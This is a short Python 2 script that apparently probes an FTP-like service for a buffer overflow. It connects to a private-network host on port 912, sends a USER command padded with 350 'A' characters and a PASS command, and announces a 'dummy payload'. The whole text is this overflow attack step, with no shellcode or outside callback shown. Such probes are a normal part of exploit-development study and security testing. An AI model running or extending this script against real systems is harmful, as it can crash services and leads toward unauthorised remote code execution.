import struct
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buff = 'A' * 350
target = '192.168.0.102'
port = 912
s.connect((target, port))
data = s.recv(1024)
s.send('USER '+buff+'\r\n')
data = s.recv(1024)
s.send('PASS yo \r\n')
data = s.recv(1024)
print " [+] sending dummy payload"
s.close()
print " [+] done! "
